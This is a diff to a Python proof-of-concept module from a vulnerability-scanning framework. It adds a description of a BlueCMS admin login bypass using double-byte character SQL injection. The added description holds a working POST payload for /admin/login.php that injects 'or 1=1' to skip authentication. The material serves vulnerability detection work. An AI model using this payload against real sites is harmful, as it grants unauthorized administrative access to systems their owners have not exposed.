@@ -4,12 +4,14 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
 class Vuln(ABVuln):
-    vuln_id = 'BlueCMS_0001' # 平台漏洞编号，留空
+    vuln_id = 'BlueCMS_0002' # 平台漏洞编号，留空
     name = 'BlueCMS 双字节万能密码进后台'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
     type = VulnType.INJECTION # 漏洞类型
     disclosure_date = '2013-04-01'  # 漏洞公布时间
     desc = '''
+        BlueCMS /admin/login.php 双字节万能密码进后台：
+        admin_name=hentai%d5%27%20or%201%3d1%23&admin_pwd=hentai&submit=%B5%C7%C2%BC&act=do_login
     '''  # 漏洞描述
     ref = ''  # 漏洞来源
     cnvd_id = ''  # cnvd漏洞编号
